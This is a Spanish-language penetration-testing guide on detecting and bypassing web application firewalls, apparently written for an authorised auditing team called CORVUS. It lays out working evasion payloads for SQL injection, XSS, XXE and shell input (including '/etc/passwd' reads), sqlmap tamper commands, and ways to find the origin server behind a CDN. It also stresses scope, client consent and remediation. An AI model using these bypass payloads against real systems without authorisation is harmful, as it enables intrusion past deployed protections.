## 1. Qué es y por qué funciona un bypass

Un **WAF** (*Web Application Firewall*, cortafuegos de aplicaciones web) inspecciona las peticiones HTTP antes de que lleguen a la aplicación y bloquea las que coinciden con patrones de ataque. Puede ser un servicio en la nube o CDN (Cloudflare, Akamai, AWS WAF, Azure Front Door/Application Gateway, Imperva, Fastly Next-Gen WAF, F5), un módulo del servidor (ModSecurity o Coraza con el OWASP Core Rule Set) o una capa en el *gateway* de API.

Modelos:

- **Modelo negativo** (lista de bloqueo): bloquea lo que coincide con firmas conocidas. Es el más común y el más evadible.
- **Modelo positivo** (lista de permitidos): solo deja pasar lo que encaja con un esquema esperado. Más robusto, pero raro fuera de APIs con esquema estricto.
- **Puntuación y aprendizaje automático:** suma puntos de anomalía o usa un modelo que estima la probabilidad de ataque; se evade reduciendo las señales que más pesan.

Por qué funcionan las evasiones:

1. **Conflicto de interpretación:** el WAF y la aplicación decodifican, normalizan o trocean la petición de forma diferente (codificaciones, parámetros duplicados, tipos de contenido, *charset*, multipart, troceado).
2. **Límites de inspección:** por rendimiento, el WAF solo inspecciona los primeros N KB del cuerpo, cierto número de parámetros o ciertas partes (query, cuerpo, cabeceras concretas).
3. **Firmas incompletas:** el lenguaje objetivo (SQL, HTML/JS, shell) tiene muchas formas equivalentes de expresar lo mismo.
4. **Arquitectura:** el servidor de origen acepta tráfico directo sin pasar por el WAF.

**Principio rector para CORVUS:** se evade el WAF **solo para demostrar que la vulnerabilidad de la aplicación existe y es explotable**. El objetivo final del informe es corregir la aplicación; el WAF se reporta como defensa en profundidad mejorable.

## 2. Dónde buscar (identificar el WAF)

Señales pasivas en respuestas normales y en páginas de bloqueo:

| Producto | Indicadores habituales |
|---|---|
| Cloudflare | `Server: cloudflare`, `CF-RAY`, cookies `__cf_bm` / `cf_clearance`, rutas `/cdn-cgi/` |
| Akamai | `Server: AkamaiGHost`, página «Access Denied … Reference #…» |
| AWS WAF / CloudFront | `X-Amz-Cf-Id`, `Via: … (CloudFront)`, 403 «Request blocked… Generated by cloudfront»; cookies `AWSALB*` del balanceador |
| Imperva / Incapsula | `X-CDN: Imperva` o `Incapsula`, `X-Iinfo`, cookies `incap_ses_*`, `visid_incap_*` |
| F5 BIG-IP ASM / Advanced WAF | «The requested URL was rejected… Your support ID is…», cookies `TS01…`, `BIGipServer…` |
| Azure Front Door / Application Gateway | `X-Azure-Ref`, páginas 403 de Azure |
| Sucuri | `X-Sucuri-ID`, `Server: Sucuri/Cloudproxy` |
| ModSecurity / Coraza + CRS | 403 genérico del servidor (Apache, nginx) solo ante cargas típicas; a veces `Mod_Security` en la página |
| Fastly Next-Gen WAF | cabeceras de Fastly (`X-Served-By`, `X-Cache`) junto a bloqueos 406/403 |

```bash
wafw00f -a https://target.example                 # todas las coincidencias
python3 identYwaf.py https://target.example       # identificación "a ciegas" por comportamiento
nmap -p443 --script http-waf-detect,http-waf-fingerprint target.example
```

Comprueba también: si el WAF cambia entre hosts (`www`, `api`, `static`), entre HTTP/1.1 y HTTP/2, y si hay un segundo filtro en la aplicación (validación propia, *sanitizers*), que es distinto del WAF.

## 3. Detección segura (mapear reglas sin ruido)

1. **Línea base:** petición normal → código, tamaño, cabeceras y tiempo. Después una carga claramente maliciosa pero inocua (`<script>alert(1)</script>` en un parámetro inventado). Anota cómo es un bloqueo: código (403, 406, 501, 200 con página de bloqueo), tamaño, cabeceras, identificador de incidente.
2. **Distinguir WAF de aplicación:** un bloqueo del WAF suele ser idéntico para cualquier ruta, incluso inexistente (`/no-existe?x=<script>`). Un error de la aplicación depende del endpoint.
3. **Bisección de la firma:** quita fragmentos de la carga hasta encontrar el mínimo que dispara el bloqueo (`<script>` → `<script` → `<scr`; `UNION SELECT` → `UNION` → `SELECT`). Así sabes qué hay que transformar.
4. **Mapear qué partes se inspeccionan:** la misma carga en query, cuerpo de formulario, JSON, multipart, cabeceras (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies y ruta.
5. **Ritmo bajo:** el WAF puede bloquear tu IP tras varios disparos. Espacia las pruebas y coordina con el cliente; si la IP del auditor queda bloqueada, pide su desbloqueo en lugar de rotar IPs.
6. **Pedir al cliente las dos vistas** cuando sea posible: pruebas con el WAF (riesgo real expuesto) y con la IP del auditor en lista de permitidos (vulnerabilidades reales de la aplicación). Es la práctica más eficiente y la que produce el informe más útil.

## 4. Técnicas genéricas de evasión

Cada transformación solo funciona si **la aplicación** acaba interpretando la carga original. Verifica siempre que el *backend* recibe lo que esperas (por ejemplo, con una carga inocua que se refleje).

### 4.1 Capas de codificación

```text
Original           '  OR 1=1-- -          <script>
URL                %27%20OR%201%3D1--%20-  %3Cscript%3E
Doble URL          %2527                   %253Cscript%253E        (si el backend decodifica dos veces)
Unicode IIS        %u0027                  %u003Cscript%u003E      (ASP clásico / IIS antiguos)
UTF-8 sobrelargo   %c0%a7 (')  %c0%ae (.)  %c0%af (/)              (decodificadores laxos antiguos)
Escape JSON        {"q":"' OR 1=1-- -"}   {"q":"<script>"}
Entidades HTML     &#x3C;script&#x3E;  &lt;  (solo si se decodifican antes de renderizar)
Ancho completo     ＜script＞ (U+FF1C/U+FF1E), ＇ (U+FF07)       (si el backend normaliza NFKC)
Base64/hex         cuando la aplicación decodifica un parámetro (p. ej. data=PHNjcmlwdD4=)
```

Los escapes JSON (`\uXXXX`) son de las técnicas más efectivas hoy: muchos WAF analizan el JSON como texto y no decodifican los escapes, mientras que el *parser* de la aplicación sí lo hace.

### 4.2 Mayúsculas, comentarios y espacios alternativos

```text
SQL     SeLeCt, UnIoN · UN/**/ION SEL/**/ECT · /*!50000UNION*/ (comentario versionado MySQL) · UNION%0aSELECT · UNION(SELECT(1))
        espacios: %09 %0a %0b %0c %0d %a0 (MySQL) /**/ + paréntesis
HTML    <ScRiPt> · <svg/onload=…> · <svg%0conload=…> · atributos sin comillas · tabulador dentro de "jav	ascript:"
Shell   ${IFS} · {cat,/etc/passwd} · cat</etc/passwd · c''at · c\at · $@ dentro de palabras (c$@at)
```

### 4.3 Contaminación de parámetros (HPP)

El WAF y la aplicación pueden quedarse con valores diferentes cuando un parámetro aparece varias veces (ver `vulns/parameter-pollution.md`):

```text
?id=1&id=1' OR 1=1-- -                 WAF inspecciona el primero, la app usa el último
?id=1/*&id=*/UNION/*&id=*/SELECT 1,2   ASP.NET une duplicados con comas: 1/*,*/UNION/*,*/SELECT 1,2
?q=safe  +  cuerpo q=<carga>             la app mezcla query y cuerpo (p. ej. $_REQUEST, request.values)
{"q":"safe","q":"<carga>"}               JSON con claves duplicadas: primera frente a última
```

### 4.4 Confusión de tipo de contenido y *charset*

```http
POST /search HTTP/1.1
Content-Type: application/json
{"q":"<carga>"}
```

Prueba la misma carga como `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`, `application/xml` y con el tipo omitido o inventado (`application/x-foo`). Si la aplicación acepta varios formatos, el WAF suele inspeccionar bien solo uno.

**Charset exótico:** algunos *frameworks* (históricamente IIS/ASP.NET y ciertos servidores Java) decodifican el cuerpo según el `charset` declarado. Con IBM037 (EBCDIC) la carga es irreconocible para el WAF:

```python
# Codificar nombre y valor del parámetro en IBM037 y enviarlos URL-encoded
import urllib.parse
enc = lambda s: urllib.parse.quote_plus(s.encode("cp037"))
print(f"{enc('q')}={enc(chr(39) + ' OR 1=1-- -')}")
# Cabecera: Content-Type: application/x-www-form-urlencoded; charset=ibm037
```

**Multipart:** nombres de campo duplicados, `filename` y `filename*=UTF-8''…` a la vez, *boundary* con espacios o comillas, partes sin `Content-Type`, parte final sin cierre. El objetivo es que el WAF no encuentre el campo que la aplicación sí procesa.

### 4.5 Ruta, método y cabeceras

```text
/admin bloqueado → /%61dmin  /admin/  //admin  /./admin  /ADMIN (IIS)  /admin;/  /admin..;/ (Tomcat)  /admin%2f  /admin.json
Cabeceras de reescritura (Symfony, algunos IIS): X-Original-URL: /admin   X-Rewrite-URL: /admin
Método: GET bloqueado → POST, HEAD, X-HTTP-Method-Override (ver vulns/api-rest-grpc-websocket.md)
Carga en cabeceras poco inspeccionadas si la aplicación las usa: User-Agent, Referer, X-Forwarded-For, Accept-Language, cookies
```

Las cabeceras de origen (`X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `Forwarded`) pueden saltar listas de IP mal implementadas en la aplicación o en el propio WAF (ver `vulns/host-header.md`).

### 4.6 Ofuscación semántica (equivalencias del lenguaje)

Sustituye la construcción bloqueada por otra equivalente que el WAF no conoce: funciones alternativas, operadores distintos, concatenación, llamadas indirectas. Los ejemplos concretos están en la sección 6.

## 5. Evasión de protocolo e infraestructura

### 5.1 Troceado (*chunked transfer encoding*, HTTP/1.1)

Con `Transfer-Encoding: chunked` el cuerpo viaja en trozos con su tamaño en hexadecimal. Algunos WAF inspeccionan cada trozo por separado o no reensamblan:

```http
POST /search HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

6
q=1 UN
6
ION SE
6
LECT 1
0

```

Desactiva «Update Content-Length» en Burp Repeater y respeta los `\r\n`. Las discrepancias entre `Content-Length` y `Transfer-Encoding` pertenecen a otra técnica con riesgo de afectar a otros usuarios: ver `vulns/request-smuggling.md`.

### 5.2 Cuerpos que superan el límite de inspección

Muchos WAF solo inspeccionan los primeros KB del cuerpo y, por defecto, dejan pasar o evalúan parcialmente el resto. Ejemplos documentados: AWS WAF inspecciona por defecto 8 KB del cuerpo en Application Load Balancer y AppSync y 16 KB en CloudFront, API Gateway y otros (ampliable hasta 64 KB con coste), con una política configurable para el contenido sobredimensionado; otros productos tienen límites propios que dependen del plan o de la configuración.

```bash
# Relleno inocuo antes de la carga (JSON)
python3 - <<'EOF' > body.json
import json; print(json.dumps({"pad": "A" * 70000, "q": "' OR 1=1-- -"}))
EOF
curl -s -X POST https://target.example/api/search -H "Content-Type: application/json" --data-binary @body.json
# Formulario: pad=AAAA…(70 KB)&q=<carga>   · Multipart: primera parte de relleno, después el campo real
```

La extensión de Burp **nowafpls** (Assetnote) automatiza la inserción de relleno según el tipo de contenido. Sube el tamaño de forma progresiva (8, 16, 64, 128 KB) y para en cuanto pase. Si la aplicación rechaza cuerpos grandes, la técnica no aplica (y eso es una buena defensa).

### 5.3 Particularidades de HTTP/2 (y HTTP/3)

- Compara el comportamiento con `curl --http1.1` y `curl --http2`: algunos despliegues aplican reglas distintas o el WAF solo inspecciona bien una versión.
- En HTTP/2 no existe el troceado de HTTP/1.1; si el *front-end* convierte HTTP/2 a HTTP/1.1 (*downgrade*), los caracteres especiales en cabeceras y las discrepancias de longitud derivan en *request smuggling* HTTP/2 (ver `vulns/request-smuggling.md`).
- Pseudo-cabeceras: `:authority` frente a `Host`; WAF que validan una y aplicaciones que usan la otra.
- HTTP/3 (QUIC, sobre UDP) anunciado con `Alt-Svc`: comprueba si la ruta HTTP/3 pasa por la misma inspección (`curl --http3` si tu `curl` lo soporta).
- ⚠️ Los ataques de agotamiento de HTTP/2 (*Rapid Reset*, CVE-2023-44487; inundaciones de *CONTINUATION*) son denegaciones de servicio: **fuera de alcance salvo confirmación explícita del cliente** y nunca como técnica de evasión.

### 5.4 Servidor de origen detrás del CDN/WAF

Si el servidor de origen acepta conexiones directas, el WAF del CDN se evita por completo. Fuentes para descubrir la IP de origen:

```bash
# Historial DNS (registros A antiguos anteriores al CDN): SecurityTrails, ViewDNS, DNSdumpster
# Subdominios sin proxy: origin., direct., dev., staging., mail., ftp., cpanel.
dig +short mail.target.example ; dig +short TXT target.example | grep spf
# Certificados: buscar el nombre del cliente en Censys (búsqueda por nombre en certificados TLS) y en crt.sh
# Hash del favicon (Shodan: http.favicon.hash:<valor>)
python3 -c "import mmh3,requests,codecs;print(mmh3.hash(codecs.encode(requests.get('https://target.example/favicon.ico').content,'base64')))"
# Cabeceras de correos de la aplicación (registro, restablecimiento) y conexiones salientes (webhooks, SSRF) revelan IPs propias
```

Verificación sin cambiar DNS:

```bash
curl -sk --resolve target.example:443:203.0.113.10 https://target.example/ -o origin.html -w "%{http_code}\n"
curl -sk https://target.example/ -o cdn.html ; diff <(wc -c < origin.html) <(wc -c < cdn.html)
```

⚠️ **Antes de enviar una sola carga al origen, confirma con el cliente que esa IP le pertenece y está dentro del alcance.** Las IP compartidas o de terceros (hosting, otros clientes del CDN) quedan fuera. Un origen accesible directamente es por sí mismo un hallazgo de configuración (A02): recomendar restringir el origen a los rangos del CDN, autenticación mutua (mTLS / *authenticated origin pulls*) o túneles.

## 6. Evasión por clase de vulnerabilidad

Cargas de partida tras confirmar con la bisección qué parte se bloquea. Cada bloque enlaza con el fichero de la vulnerabilidad.

### 6.1 Inyección SQL (`vulns/sqli.md`)

```text
' OR 1=1-- -          →  ' OR 2>1-- -   ·  ' OR 'a'='a  ·  ' OR true-- -  ·  '||1#  ·  ' OR 3 BETWEEN 2 AND 4-- -
UNION SELECT          →  /*!50000UNION*//*!50000SELECT*/  ·  UNION%0aALL%0aSELECT  ·  UNION(SELECT(1),(2))  ·  UnIoN/**/SeLeCt
espacios              →  /**/  %09  %0a  %0c  %a0 (MySQL)  paréntesis
comillas              →  0x61646d696e (hex, MySQL)  ·  CHAR(97,100,109,105,110)  ·  CHR(97)||CHR(100) (PostgreSQL/Oracle)
funciones vigiladas   →  SUBSTRING→MID/SUBSTR/LEFT/RIGHT · ASCII→ORD · SLEEP(5)→BENCHMARK(…) (MySQL), pg_sleep(5) (PostgreSQL)
JSON dentro de SQL    →  ' OR JSON_EXTRACT('{"a":1}','$.a')=1-- -                       (MySQL)
                        ' OR '{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb-- -           (PostgreSQL)
```

La sintaxis JSON dentro de SQL (investigación de Team82/Claroty, 2022) evadía a varios WAF que no la entendían; los fabricantes lo corrigieron, así que su eficacia depende del conjunto de reglas. GoSecure documentó en 2021 un bypass de AWS WAF basado en la notación científica de MySQL (`1.e(`) que rompe palabras clave para el WAF pero no para MySQL.

```bash
# sqlmap con tampers, solo tras confirmar la inyección manualmente
sqlmap -r req.txt --tamper=space2comment,between,randomcase --random-agent --delay=1 --level=2
sqlmap -r req.txt --tamper=charencode,equaltolike,modsecurityversioned
```

### 6.2 XSS (`vulns/xss.md`)

```html
<svg/onload=alert(1)>                      <details open ontoggle=alert(1)>
<img src=x onerror=alert`1`>               <svg><animate onbegin=alert(1) attributeName=x dur=1s>
<x onpointerenter=alert(1)>pasa el ratón   <body onpageshow=alert(1)>
<a href="jav&#x09;ascript:alert(1)">x</a>  <a href="&#106;avascript:alert(1)">x</a>
<img src=x onerror="window['al'+'ert'](1)">   <img src=x onerror=top[atob('YWxlcnQ=')](1)>
<img src=x onerror=self[`al`+`ert`](document.domain)>
Contexto JS:  '-alert(1)-'   ·  alert(1)   ·  ${alert(1)} (plantillas literales)
Sin paréntesis: onerror=alert;throw 1   ·  alert`1`
```

Busca eventos y etiquetas menos conocidos en la *XSS cheat sheet* de PortSwigger filtrando por los que pasan el WAF (Burp Intruder con la lista de eventos, a baja velocidad). Usa `alert(document.domain)` o `print()` como prueba, nunca cargas que roben datos reales.

### 6.7 XXE (`vulns/xxe.md`)

```bash
# El WAF busca "<!ENTITY" o "SYSTEM" en UTF-8: convertir el documento a UTF-16
iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml      # declarar encoding="UTF-16BE" en el prólogo
```

Otras vías: entidades de parámetro en una DTD externa propia (la carga visible es mínima), XInclude cuando no se controla el `DOCTYPE`, XML dentro de SVG, DOCX/XLSX u otros contenedores, y cambiar `Content-Type: application/json` a `application/xml` en APIs que aceptan ambos.

### 6.8 NoSQL, deserialización, GraphQL y otras

- **NoSQL** (`vulns/nosqli.md`): `{"$ne":null}` → `{"$ne":null}` (escape JSON); sintaxis de formulario `user[$ne]=x` frente a JSON.
- **Deserialización** (`vulns/deserialization.md`): objetos en base64, comprimidos con gzip o en cookies que el WAF no decodifica; el WAF suele buscar firmas como `rO0AB` (Java) o `O:` (PHP).
- **GraphQL** (`vulns/graphql.md`, sección 5): carga en `variables`, alias, lotes, comentarios `#`, transporte GET/form.
- **Inyecciones varias** (LDAP, XPath, CRLF, cabeceras): `vulns/otras-inyecciones.md`.
- **Filtros de prompts en aplicaciones con LLM**: ver `vulns/llm-ai.md`.

## 7. Ética, alcance y cómo reportarlo

- **Finalidad única:** demostrar la vulnerabilidad subyacente. No se busca desactivar, saturar ni degradar el WAF.
- **Volumen mínimo:** los *fuzzers* de evasión generan miles de peticiones y pueden provocar bloqueos de IP o alertas del SOC; usarlos solo con permiso, a ritmo bajo y coordinados con el cliente.
- **Sin denegación de servicio:** nada de *Rapid Reset*, inundaciones de cabeceras o cuerpos gigantes repetidos. ⚠️ Cualquier prueba de carga **requiere confirmación explícita del cliente**.
- **Antiautomatización y gestión de bots:** resolver CAPTCHAs, usar proxies residenciales o falsificar huellas TLS y de navegador para eludir sistemas antibot queda **fuera del alcance de CORVUS** salvo que el contrato lo pida expresamente; CORVUS no resuelve CAPTCHAs. Sí es un hallazgo legítimo que el CAPTCHA no se valide en servidor o que su token se pueda reutilizar (ver `vulns/business-logic.md`).
- **Servidor de origen:** confirmar propiedad y alcance de la IP antes de probarla (sección 5.4).
- **Cómo reportar:**
  1. La **vulnerabilidad de la aplicación** se reporta con su severidad propia. El WAF no la corrige; como mucho, en el análisis de riesgo se menciona que exige una evasión conocida (en CVSS, la necesidad de evadir un control puede justificar `AC:H` o `AT:P` solo si la evasión es realmente difícil o condicional).
  2. La **evasión del WAF** se reporta como observación de defensa en profundidad (o hallazgo de configuración si el origen está expuesto), incluyendo la carga exacta que pasó, para que el cliente ajuste las reglas.
  3. Recomendación doble: corregir el código (consultas parametrizadas, codificación de salida, validación) y, como capa adicional, ajustar el WAF (modo bloqueo, nivel de paranoia del CRS, inspección de JSON y multipart, límites de cuerpo coherentes, reglas virtuales mientras se despliega el arreglo).

## 8. Falsos positivos frecuentes

- **El 403 es de la aplicación, no del WAF** (control de acceso, validación propia): la carga «evadida» no demuestra nada sobre el WAF.
- **La carga pasa el WAF pero la aplicación la neutraliza** (escapado, consultas parametrizadas): no hay vulnerabilidad; la evasión carece de impacto y no debe reportarse como hallazgo.
- **La transformación cambia el significado**: la carga llega codificada al *backend* y no se ejecuta; comprueba siempre el efecto (error SQL, retardo, ejecución en el navegador, interacción fuera de banda).
- **Bloqueo por reputación o frecuencia**, no por contenido: la misma petición inocua también se bloquea.
- **WAF en modo detección** (solo registra): todo «pasa»; anótalo como observación de configuración, no como evasión.
- **Respuestas en caché** que no llegan al origen ni al WAF.
- **Diferencias por región o nodo del CDN**: repite desde la misma ubicación antes de concluir.
- **Origen «expuesto» que en realidad es otro servicio** del mismo proveedor: compara contenido y certificado antes de afirmarlo.

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso |
|---|---|
| wafw00f | Identificar el WAF: `wafw00f -a https://target.example` |
| identYwaf | Identificación por comportamiento: `python3 identYwaf.py https://target.example` |
| nmap NSE | `nmap -p443 --script http-waf-detect,http-waf-fingerprint target.example` |
| Burp Repeater + Hackvertor | Bisección manual de firmas y codificaciones anidadas con etiquetas |
| nowafpls (Burp) | Relleno para superar el límite de inspección del cuerpo |
| Burp Intruder / ffuf (a baja velocidad) | Probar listas de etiquetas, eventos o variantes tras identificar la firma: `ffuf -u 'https://target.example/s?q=FUZZ' -w variantes.txt -rate 2 -fc 403` |
| sqlmap `--tamper` | Automatizar evasión de una inyección SQL ya confirmada |
| GoTestWAF (Wallarm) | Evaluar la cobertura de un WAF con miles de cargas: solo con autorización y normalmente contra preproducción (`docker run --rm wallarm/gotestwaf --url=https://staging.target.example`) |
| CloudFlair, Censys, Shodan, SecurityTrails, crt.sh | Descubrir el servidor de origen (sección 5.4) |
| `curl --resolve` / `--http1.1` / `--http2` | Verificar origen y diferencias de protocolo |
